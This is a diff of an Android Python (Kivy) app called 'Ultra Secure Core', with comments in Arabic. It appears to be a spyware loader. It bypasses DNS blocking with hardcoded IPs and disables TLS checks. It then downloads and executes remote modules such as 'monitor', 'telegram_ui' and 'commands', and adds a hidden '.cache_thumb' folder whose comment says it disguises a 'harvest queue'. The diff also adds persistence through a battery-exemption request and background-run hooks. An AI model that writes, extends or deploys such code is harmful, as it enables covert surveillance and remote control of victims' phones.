@@ -22,13 +22,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== 1. تجاوز DNS: ربط الأسماء بعناوين IP ثابتة ==========
 def _patch_dns():
-    """
-    تخدع مكتبة socket لتربط النطاقات المحظورة بعناوين IP حقيقية دون الحاجة لاستعلام DNS.
-    """
     original_getaddrinfo = socket.getaddrinfo
 
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        # قائمة الأسماء مع عناوين IP البديلة
         override = {
             'raw.githubusercontent.com': [
                 '185.199.108.133', '185.199.109.133',
@@ -37,7 +33,7 @@ def _patch_dns():
             'cdn.jsdelivr.net': [
                 '151.101.2.229', '151.101.66.229', '151.101.130.229'
             ],
-            'zaen1993.github.io': [   # GitHub Pages
+            'zaen1993.github.io': [
                 '185.199.108.153', '185.199.109.153',
                 '185.199.110.153', '185.199.111.153'
             ]
@@ -82,36 +78,14 @@ R = _get_path()
 U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
 
+# إنشاء مجلد التخزين المؤقت (مخفي باسم .cache_thumb للتمويه)
+HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
+os.makedirs(HARVEST_QUEUE, exist_ok=True)
+
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. دالة تثبيت مكتبات AI ديناميكياً (لتجنب فشل البناء) ==========
-def _ensure_ai_libs():
-    """
-    يحاول تثبيت numpy و tflite-runtime داخل بيئة التطبيق (site-packages).
-    يتم استدعاؤها في خيط منفصل بعد تحميل الملفات الأساسية.
-    """
-    try:
-        import numpy
-        import tflite_runtime
-        # موجودة بالفعل
-        return True
-    except ImportError:
-        # محاولة التثبيت باستخدام pip المضمن
-        try:
-            import subprocess
-            # تثبيت numpy أولاً (أخف حجماً وأقل تعقيداً)
-            subprocess.run([sys.executable, '-m', 'pip', 'install', 'numpy==1.26.4'],
-                           capture_output=True, check=True)
-            # محاولة تثبيت tflite-runtime (قد تفشل، لكنها ليست حرجة للتشغيل الأساسي)
-            subprocess.run([sys.executable, '-m', 'pip', 'install', 'tflite-runtime==2.14.0'],
-                           capture_output=True, check=True)
-            return True
-        except Exception as e:
-            print(f"[AI] Failed to install AI libs: {e}")
-            return False
-
-# ========== 5. دالة طلب الأذونات ==========
+# ========== 4. دالة طلب الأذونات + استثناء البطارية ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -135,7 +109,21 @@ def _perms():
     except Exception as e:
         print(f"Permissions error: {e}")
 
-# ========== 6. تطبيق Kivy الرئيسي ==========
+    # طلب استثناء البطارية (اختياري لكن مفيد)
+    try:
+        from jnius import autoclass
+        PowerManager = autoclass('android.os.PowerManager')
+        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+        pm = ctx.getSystemService(ctx.POWER_SERVICE)
+        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
+            Intent = autoclass('android.content.Intent')
+            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.setData(android.net.Uri.parse(f"package:{ctx.getPackageName()}"))
+            ctx.startActivity(intent)
+    except Exception as e:
+        print(f"Battery exemption error: {e}")
+
+# ========== 5. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
         self.title = "Ultra Secure Core v6.0.0"
@@ -208,20 +196,32 @@ class CoreApp(App):
             for current_url in candidates:
                 try:
                     self._log(f"Downloading {filename} (attempt {attempt+1}) from {current_url.split('/')[2]}...")
-                    resp = requests.get(current_url, headers=HEADERS, timeout=20, verify=False)
-                    if resp.status_code == 200 and len(resp.text) > 200:
-                        with open(tmp_path, 'w', encoding='utf-8') as f:
-                            f.write(resp.text)
-                        if self._verify_module(tmp_path, filename):
-                            with open(tmp_path, 'r', encoding='utf-8') as src:
-                                content = src.read()
-                            with open(final_path, 'w', encoding='utf-8') as dst:
-                                dst.write(content)
-                            self._log(f"✅ {filename} downloaded successfully")
-                            return True
-                        else:
-                            self._log(f"❌ {filename} failed verification", "ERROR")
-                            return False
+                    # استخدام stream=True لتقليل استخدام الذاكرة
+                    resp = requests.get(current_url, headers=HEADERS, timeout=20, verify=False, stream=True)
+                    if resp.status_code == 200:
+                        content_chunks = []
+                        total_len = 0
+                        for chunk in resp.iter_content(chunk_size=8192):
+                            if chunk:
+                                content_chunks.append(chunk.decode('utf-8', errors='ignore'))
+                                total_len += len(chunk)
+                                if total_len > 5000000:  # حد أقصى 5 ميجابايت
+                                    self._log(f"File too large (>5MB), aborting.", "WARN")
+                                    break
+                        content = "".join(content_chunks)
+                        if len(content) > 200:
+                            with open(tmp_path, 'w', encoding='utf-8') as f:
+                                f.write(content)
+                            if self._verify_module(tmp_path, filename):
+                                with open(tmp_path, 'r', encoding='utf-8') as src:
+                                    content = src.read()
+                                with open(final_path, 'w', encoding='utf-8') as dst:
+                                    dst.write(content)
+                                self._log(f"✅ {filename} downloaded successfully")
+                                return True
+                            else:
+                                self._log(f"❌ {filename} failed verification", "ERROR")
+                                return False
                 except Exception as e:
                     self._log(f"Error from {current_url}: {e}", "WARN")
             time.sleep(3)
@@ -232,11 +232,10 @@ class CoreApp(App):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
-        # طلب الأذونات بعد بدء التطبيق
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # --- 1. جلب index.json ---
+        # جلب index.json
         all_files = []
         for idx_url in INDEX_URLS:
             try:
@@ -254,14 +253,17 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # --- 2. تحميل الملفات ---
+        # تحميل الملفات
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download_safe(file_url, filename)
 
-        # --- 3. تنظيف الموديولات القديمة ---
+        # تأخير قصير
+        time.sleep(1)
+
+        # تنظيف الموديولات القديمة
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
@@ -273,16 +275,13 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # --- 4. محاولة تثبيت مكتبات AI (numpy & tflite) في الخلفية ---
-        threading.Thread(target=_ensure_ai_libs, daemon=True).start()
-
-        # --- 5. التأكد من وجود telegram_ui.py ---
+        # التأكد من وجود telegram_ui.py
         telegram_path = os.path.join(R, "telegram_ui.py")
         if not os.path.exists(telegram_path):
             self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
             return
 
-        # --- 6. تشغيل النظام الأساسي ---
+        # تشغيل النظام الأساسي
         try:
             import monitor
             import telegram_ui
@@ -321,6 +320,15 @@ class CoreApp(App):
             self._log(f"FATAL ERROR: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
 
+    # ========== دالتا الحفاظ على الخدمة ==========
+    def on_pause(self):
+        # إخبار نظام Android أن التطبيق يستمر بالعمل في الخلفية
+        return True
+
+    def on_stop(self):
+        # في حال تم إيقاف التطبيق قسراً، يمكن إعادة تشغيل الخدمة هنا
+        self._log("App stopped. Restarting service if needed.")
+        return True
 
 if __name__ == '__main__':
     CoreApp().run()
